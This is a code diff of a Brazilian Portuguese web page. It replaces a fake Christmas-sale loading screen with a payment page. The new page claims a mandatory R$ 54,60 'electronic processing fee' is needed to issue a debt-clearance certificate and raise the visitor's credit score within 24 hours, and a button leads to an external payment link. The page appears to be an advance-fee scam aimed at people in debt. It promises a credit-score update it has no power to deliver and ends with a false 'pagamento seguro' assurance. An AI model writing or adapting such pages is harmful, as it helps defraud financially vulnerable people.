@@ -1,89 +1,62 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="pt-BR">
-<head>
+  <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Carregando...</title>
+    <title>Pagamento</title>
     <style>
-        body {
-            margin: 0;
-            padding: 0;
-            font-family: Arial, sans-serif;
-            background: url('fundo-natal.png') center/cover no-repeat;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            text-align: center;
-        }
+      body{font-family:Arial, sans-serif; background:#fafafa; margin:0; padding:0; text-align:center; color:#333;}
+      .container{max-width:600px; margin:40px auto; padding:20px;}
+      h1{font-size:28px; font-weight:700; margin-bottom:8px;}
+      .subtitle{color:#777; font-size:16px; margin-bottom:30px;}
+      .box{background:#eaf3ff; border-radius:12px; padding:20px; text-align:left; margin-bottom:30px; border:1px solid #d6e8ff;}
+      .box p{margin:0 0 10px 0; line-height:1.5;}
 
-        .loader-box {
-            width: 90%;
-            max-width: 400px;
-        }
+      .valor{background:#ffd8e6; border:1px solid #ffc1da; border-radius:12px; padding:25px; margin-bottom:30px;}
+      .valor h2{margin:0; color:#c72755; font-weight:700;} 
+      .valor .taxa{font-size:14px; margin-top:6px; color:#555;}
 
-        .progress-bar {
-            width: 100%;
-            background: #e0e0e0;
-            border-radius: 20px;
-            overflow: hidden;
-            margin-top: 20px;
-            height: 25px;
-        }
+      .proc{background:#eaf3ff; border-radius:12px; padding:20px; text-align:left; border:1px solid #d6e8ff;}
+      .proc h3{margin:0 0 15px 0;}
+      .proc ul{padding-left:20px; margin:0;}
 
-        .progress-fill {
-            height: 100%;
-            width: 0%;
-            background: #e600b8;
-            border-radius: 20px;
-            transition: width 0.3s ease-in-out;
-        }
-
-        .percent-text {
-            margin-top: 10px;
-            font-size: 20px;
-            font-weight: bold;
-            color: #e600b8;
-        }
+      .btn{display:block; width:100%; background:#e50075; color:#fff; padding:15px; border-radius:12px; margin-top:30px; font-size:18px; font-weight:600; text-decoration:none;}
+      .seguro{margin-top:15px; font-size:14px; color:#777;}
     </style>
-</head>
-<body>
+  </head>
+  <body>
+    <div class="container">
 
-    <div class="loader-box">
-        <h1 style="color:#e600b8;font-size:32px;font-weight:900;margin-bottom:10px;font-family:Arial, Helvetica, sans-serif;">
-    MEGA FEIRÃO<br>Promoção de Natal
-</h1>
-        <h2>Carregando...</h2>
+      <h1>Pagamento da Taxa Obrigatória</h1>
+      <div class="subtitle">Finalize seu processo de regularização</div>
 
-        <div class="progress-bar">
-            <div id="progress" class="progress-fill"></div>
-        </div>
+      <div class="box">
+        <p>Para a emissão do seu comprovativo oficial de quitação de dívidas e para garantir a atualização do seu score de crédito nos sistemas de proteção ao crédito, é necessário o pagamento da Taxa de Processamento Eletrônico (TPE).</p>
+        <p>Esta taxa cobre os custos operacionais e de processamento junto aos órgãos de proteção ao crédito.</p>
+      </div>
 
-        <div id="percent" class="percent-text">0%</div>
+      <div class="valor">
+        <div>VALOR DA TAXA</div>
+        <h2>R$ 54,60</h2>
+        <div class="taxa">Taxa única obrigatória</div>
+      </div>
 
-        <a href="https://limpabrasil-eng.github.io/uio/inicio/" class="link-btn" style="display:block;margin-top:25px;background:#e600b8;color:white;padding:15px 0;border-radius:30px;font-size:18px;font-weight:bold;text-decoration:none;">Acessar Agora</a>
+      <div class="proc">
 
+	
+        <h3>Processo após o pagamento</h3>
+        <ul>
+          <li>Confirmação automática do pagamento</li>
+          <li>Emissão e envio do comprovativo por email</li>
+          <li>Atualização do score de crédito em até 24 horas</li>
+        </ul>
+      </div>
+	  
+	  <a href="https://pay.aplicativo-novembro-taxa.site/DYp0ZxVdMjQgmvX" class="btn">Pagar Taxa Agora</a>
+
+
+      <div class="seguro">✔ Pagamento seguro e protegido</div>
     </div>
 
-    <script>
-        let percent = 0;
-        const bar = document.getElementById("progress");
-        const text = document.getElementById("percent");
-
-        const loading = setInterval(() => {
-            percent++;
-            bar.style.width = percent + "%";
-            text.innerText = percent + "%";
-
-            if (percent >= 100) {
-                clearInterval(loading);
-                // redirecionamento removido // redireciona
-            }
-        }, 40); // velocidade
-    </script>
-
-</body>
+  </body>
 </html>
-
-
-
